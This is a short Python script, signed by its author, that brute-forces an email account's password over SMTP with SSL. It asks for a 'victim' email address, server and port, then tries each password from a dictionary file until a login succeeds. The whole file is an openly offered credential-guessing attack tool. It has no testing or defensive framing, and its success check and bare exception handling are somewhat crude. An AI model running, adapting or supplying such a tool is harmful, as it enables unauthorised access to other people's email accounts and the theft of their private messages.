#!/usr/bin/env python3
# Python 3.4 
# bruteforce over SMTP + SSL
# made by Xtr3am3r.0k@gmail.com 

import smtplib
import email
import sys
import time
import os
        
victim_mail = input("\n[+] Enter victims email: " )
smtp_server = input("\n[+] Enter victims smtp server (exemple: smtp.mail.ru): ")
port = input("\n Enter smtp port: ")
dict_brut = open('dictionary.txt','r')
for list_pass in dict_brut:
    passwd = list_pass.rstrip()
    print("[*] try password: {} ".format(passwd))
    try:
        smtp = smtplib.SMTP_SSL(smtp_server, int(port))
        smtp.ehlo()
        answer, status  = smtp.login(victim_mail, passwd)
        if status == b'Authentication succeeded':
            print("\n[+] Cool Password Found: {}".format(passwd))
            break
        else:
            raise ConnectionResetError
    except:
        time.sleep(1)
        pass